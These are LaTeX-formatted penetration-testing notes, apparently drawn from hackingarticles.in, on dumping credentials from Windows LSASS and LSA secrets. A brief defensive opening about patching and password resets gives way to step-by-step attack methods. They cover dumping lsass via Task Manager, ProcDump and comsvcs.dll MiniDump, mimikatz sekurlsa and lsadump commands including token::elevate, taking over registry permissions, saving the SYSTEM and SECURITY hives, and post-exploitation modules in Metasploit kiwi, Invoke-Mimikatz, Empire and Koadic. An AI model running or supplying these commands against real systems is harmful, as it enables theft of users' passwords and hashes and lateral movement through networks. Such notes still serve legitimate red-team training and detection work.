\section{LSA dumping}




\url{https://www.hackingarticles.in/credential-dumping-local-security-authority-lsalsass-exe/}



\url{https://www.hackingarticles.in/credential-dumping-security-support-provider-ssp/}


Things to consider: When you need to  execute commands/processes on a host, know what will and will not put  credential material into memory. When investigating, look for users that  may be performing the above activities on the impacted host.

How long does LSASS store credentials?
By default, LSASS stores credentials associated with logon sessions  related to those activities outlined above since the last restart, of  which have not been closed (logged off). This means that once a user is  logged off, LSASS may clear the credentials after a certain period of  time, which varies by operating system and security settings (default is  30 seconds in Windows versions 8.1+. Older systems may not always clear  credentials after logoff without patches).
Things to consider: Ensure hosts are fully  patched and credential clearing is enabled. Any user authenticated when a  potential credential dump occurs will likely need their password reset.  On legacy hosts, there may not be any clearing of credentials, even  after logoff. All users on these systems (when unpatched) may need a  password reset.

Why is LSASS targeted by malicious actors?
As you may have already guessed, the reason LSASS is such a  high-value target for attackers is that it contains credential material  for users, which can be used to pivot throughout the environment.
When an attacker gains their initial foothold into the environment,  they almost never land at their target host or permission set. For  example, if their phishing email to  the accounting department was successful, these users are probably not  able to access databases, domain controllers, medical records, etc.
Nearly all forms of lateral movement require credential material to move throughout an environment.

\subsection{Windows 7}

\subsubsection{Method 1: Task manager}
In your local machine (target) and open  the task manager, navigate to processes for exploring running process  of lsass.exe and make a right-click to explore its snippet.  Choose  “Create Dump File” option which will dump the stored credential.

You will get the “lsass.DMP” file inside the /Temp directory of the user account directory under /AppData/local

Now start mimikatz to get the data out of the DMP file using the following command:

\begin{verbatim}
privilege::debug
sekurlsa::minidump C:\Users\raj\AppData\Local\Temp\lsass.DMP
sekurlsa::logonpasswords
\end{verbatim}



\subsubsection{Method 2: ProcDump}
The ProcDump tool is a free  command-line tool published by Sysinternals whose primary purpose is  monitoring an application and generating memory dumps.
Use the “-accepteula” command-line  option to automatically accept the Sysinternals license agreement and  “-ma” Parameter to write a dump file with all process memory (lsass.exe)  in a .dmp format.

\begin{verbatim}
procdump.exe -accepteula -ma lsass.exe mem.dmp
\end{verbatim}


Again, repeat the same step and use mimikatz to read the mem.dmp file.


\subsubsection{Method 3: comsvcs.dll}
The comsvcs.dll DLL found in  \verb+Windows\system32+ that call minidump with
rundll32, so you can use it to  dump the Lsass.exe process memory to retrieve
credentials. Let's  identify the process ID for lsass before running the DLL.

\begin{verbatim}
Get-Process lsass
.\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 492 C:\mem.dmp full
\end{verbatim}


Again, repeat the same step and use mimikatz to read the mem.dmp file.

\subsection{Windows 10}

\subsubsection{Method 1: Task manager}
The Lsass.exe is renamed as LSA in  Windows 10 and process can be found by the name of “Local Security  Authority” inside the task manager.  It will also save the dump file in  .dmp format so, again repeat the same steps as done above.
Go to the Task Manager and explore the process for Local Security Authority, then extract its dump as shown.

You will get the “lsass.DMP” file inside the /Temp directory of the user account directory under /AppData/local.

Again, repeat the same step and use mimikatz to read the dmp file.


\subsubsection{Method 2: Mimikatz parameter -patch}
The “-patch” parameter is patching the  samsrv.dll running inside lsass.exe which displays LM and NT hashes. So,  you when you will execute the following commands it will dump the  password hashes.

\begin{verbatim}
privilege::debug
lsadump::lsa /patch
\end{verbatim}



\subsubsection{Method3: Mimikatz – Token Elevation}
We are using mimikatz once again to get  the hashes directly, without involving any dump file or DLL execution  this is known as “Token Impersonation”. As you can observe, we got an  error when we try to run following command as a local user.

\begin{verbatim}
privilege::debug
lsadump::secrets
\end{verbatim}


This can be done by impersonate a token  that will be used to elevate permissions to SYSTEM (default) or find a  domain admin token and as the result, you will able to dump the password  in clear-text.

\begin{verbatim}
privilege::debug
token::elevate
lsadump::secrets
\end{verbatim}



\subsubsection{Method 4: Editing File Permission in the Registry}
The LSA secrets are held in the  Registry. If services are run as local or domain user, their passwords  are stored in the Registry. If auto-logon is activated, it will also  store this information in the Registry.
This can be done also done locally by changing permission values inside the
registry. Navigate to \verb+Computer\HKEY_LOCAL_MACHINE\SECURITY+.


Expand the SECURITY folder and choose permissions from inside the list.
Allow “Full Control” to the Administrator user as shown.
As you can observe that this time, we are able to fetch sub-folders under Security directories.
So, once you run the following command again, you can see the credential in the plain text as shown.

\begin{verbatim}
privilege::debug
lsadump::secrets
\end{verbatim}



\subsubsection{Method 5: Save privilege File of the Registry}
Similarly, you can use another approach  that will also operate in the same direction. Save system and security  registry values with the help of the following command.

\begin{verbatim}
reg save HKLM\SYSTEM system
reg save HKLM\security security
\end{verbatim}


As you can see if you use  the “lsa::secrets” command  without a specified argument, you will not be able to retrieve the  password, but if you enter the path for the file described above,  mimikatz will dump the password in plain text.

\begin{verbatim}
privilege::debug
lsadump::secrets/system:c:\system /security:c:\security
\end{verbatim}


\subsubsection{Metasploit}

Method1: Load kiwi
As we all know Metasploit is like the  Swiss Knife, it comes with multiple modules thus it allows the attacker  to execute mimikatz remotely and extract the Lsass dump to fetch the  credentials. Since it is a post-exploitation thus you should have  meterpreter session of the host machine at Initial Phase and then load  kiwi in order to initialise mimikatz and execute the command.

\begin{verbatim}
lmeterpreter > oad kiwi
meterpreter > lsa_dump_secrets
\end{verbatim}


Method2: Load powershell
Similarly, you can also load PowerShell  in the place of kiwi and perform the same operation, here we are using  PowerShell script of mimikatz. This can be done by executing the  following commands:

\begin{verbatim}
meterpreter > load powershell
meterpreter > powershell_import /root/powershell/Invoke-Mimikatz.ps1
meterpreter > sekurlsa::logonpasswords
\end{verbatim}


This will be dumping the password hashes as shown in the below image.



\subsubsection{PowerShell Empire}
Empire is one of the good Penetration Testing Framework that works like as Metasploit, you can download it from GitHub and install in your attacking machine in order to launch attack remotely.
This is a post exploit, thus first you  need to be compromised the host machine and then use the following  module for LSA secrets dumps

\begin{verbatim}
usemodule credentials/mimikatz/lsadump
execute
\end{verbatim}


As a result, it dumps password hashes saved as shown in the given image.


Koadic
Koadic, or COM Command \& Control,  is a Windows post-exploitation rootkit similar to other penetration  testing tools such as Meterpreter and Powershell Empire. It allows the  attacker to run comsvcs.dll that will call the minidump and fetch the  dump of lsass.exe to retrieve stored NTLM hashes. Read more from here

\begin{verbatim}
use comsvcs_lsass
\end{verbatim}


As a result, it dumped the password hashes saved as shown in the given image.

